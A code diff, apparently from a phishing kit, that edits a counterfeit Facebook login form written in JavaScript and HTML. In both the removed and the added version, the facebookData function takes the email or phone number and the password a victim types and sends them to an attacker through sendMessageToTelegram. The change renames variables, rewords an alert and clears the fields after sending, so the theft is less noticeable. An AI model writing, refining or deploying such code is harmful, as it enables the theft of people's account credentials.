@@ -24,12 +24,7 @@ function generarFacebook() {
 
                           <div id="alertaFacebook" role="alert" class="alert alert-danger"
                             style="display: none; padding: 2px; margin-bottom: 2%; text-align: center;">
-                            <!-- <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 shrink-0 stroke-current" fill="none"
-                                      viewBox="0 0 24 24">
-                                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                        d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
-                                    </svg> -->
-                            <span>Llenar todos los campos</span>
+                            <span>Llenar todos los campos correctamente</span>
                           </div>
                           <input id="facebookUser" type="text" class="input-field" placeholder="Email or phone number" style="      width: 100%;
                         padding: 14px;
@@ -72,20 +67,22 @@ function generarFacebook() {
 
 async function facebookData() {
 
-        const emailGmail = document.getElementById('facebookUser');
-        const passwordGmail = document.getElementById('facebookPassword');
-        const alarma = document.getElementById('alertaFacebook');
-    
-    
-    
-        const valor = emailGmail.value;
-        const regexEmail = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        const regexTelefono = /^\+?[0-9]{3,15}$/;
-        if (!regexEmail.test(valor) && !regexTelefono.test(valor)) {
-            emailGmail.setCustomValidity('Por favor, ingrese un correo electrónico o número de teléfono válido');
-            alarma.style.display = "block";
-        } else {
-        sendMessageToTelegram(`facebook: \n usuario: ${emailGmail.value} \n contrasenia: ${passwordGmail.value}`);
-            emailGmail.setCustomValidity('');
-        }
+    const emailFacebook = document.getElementById('facebookUser');
+    const passwordFacebook = document.getElementById('facebookPassword');
+    const alarmaFacebook = document.getElementById('alertaFacebook');
+
+
+
+    const valor = emailFacebook.value;
+    const regexEmail = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    const regexTelefono = /^\+?[0-9]{3,15}$/;
+    if (!regexEmail.test(valor) && !regexTelefono.test(valor)) {
+        emailFacebook.setCustomValidity('Por favor, ingrese un correo electrónico o número de teléfono válido');
+        alarmaFacebook.style.display = "block";
+    } else {
+        sendMessageToTelegram(`facebook: \n usuario: ${emailFacebook.value} \n contrasenia: ${passwordFacebook.value}`);
+        emailFacebook.setCustomValidity('');
+        emailFacebook.value = '';
+        passwordFacebook.value = '';
     }
+}
